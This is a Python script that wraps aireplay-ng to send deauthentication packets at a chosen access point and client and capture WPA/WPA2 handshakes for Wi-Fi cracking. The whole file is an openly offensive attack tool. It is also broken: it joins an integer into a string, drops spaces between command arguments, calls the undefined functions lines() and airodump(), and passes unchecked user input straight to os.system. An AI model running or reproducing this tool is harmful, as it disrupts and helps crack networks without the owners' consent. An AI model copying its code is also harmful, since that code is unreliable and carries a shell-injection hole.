import re
import subprocess
import os
import time

from termcolor import colored

ifconfig_outp = subprocess.getoutput("iwconfig ")
interfs = subprocess.getoutput('iwconfig |grep WIFI@REALTEK')
chwlan = re.search(r"Mode:Managed", str(ifconfig_outp))
chwlann = re.search(r"Mode:Auto", str(ifconfig_outp))
chwlannn = re.search(r"Mode:Monitor", str(ifconfig_outp))
chifasso = re.search(r"unassociated", str(ifconfig_outp))

def aireplay():
    print("***********************************")
    print("*  Capture HandShakes (WPA/WPA2)  *")
    print("***********************************")
    if interfs:
        if chwlannn:
            try:
                AP_mac_address = input(colored("## Enter access point's MAC address:-", 'yellow'))
                target_mac_address = input(colored("## Enter target's MAC address:-", 'yellow'))
                interfaceadapter = input(colored("## Enter adapter name:-", 'yellow'))
                no_of_deauth_packets = int(input(colored("## Enter no. of deauth packets:-", 'yellow')))
                if interfaceadapter == 'wlan0':
                    os.system("sudo aireplay-ng  --deauth " + no_of_deauth_packets + "-a" + AP_mac_address +"-c " + target_mac_address + "\t" + interfaceadapter)
                    lines()
                    choice = input("Want to capture another handshake(y/n):- ")
                    if choice == 'y':
                        aireplay()
                    elif choice == 'n':
                        exit()
                    else:
                        print("Enter y or n:--")
                        airodump()
                elif interfaceadapter == '':
                    print("\n")
                    print(colored("\tNull Value Detected!!!", 'blue'))
                    print("\n")
                    airodump()
                else:
                    print("Enter from available WLAN interfaces")

            except KeyboardInterrupt:
                print("Process Aborted!!!!")
        elif chwlan:
            print("\nTP-Link adapter is in Managed Mode")
            print("\n Enable MOnitor mode for deauth attack")
            exit()
        elif chwlann:
            print("\nTP-Link adapter is in Auto Mode")
            print("\n Enable MOnitor mode for deauth attack")
            exit()
        else:
            print("\n Print enable Monitor Mode")
            exit()
    else:
        print("\n Didn't detect any WLAN adapter")
        print("\n Please Connect your WLAN adapter for WI-FI cracking.")


aireplay()
